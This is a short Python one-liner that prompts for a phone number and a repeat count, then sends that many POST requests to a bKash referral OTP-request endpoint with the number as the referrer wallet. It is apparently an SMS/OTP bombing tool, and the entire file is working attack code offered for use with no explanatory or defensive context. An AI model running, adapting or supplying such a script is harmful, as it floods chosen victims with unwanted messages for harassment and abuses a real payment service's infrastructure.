import requests,json;url="https://cpp.bka.sh/external-services/referral/report/otp/request";phone_number=input("Number:");[print("success"if(r:=requests.post(url,headers={"Content-Type":"application/json"},data=json.dumps({"referrerWallet":phone_number}))).ok or(r.status_code==400and r.json().get("externalCode")=="6208")else"failed")for _ in range(int(input("Amount:")))]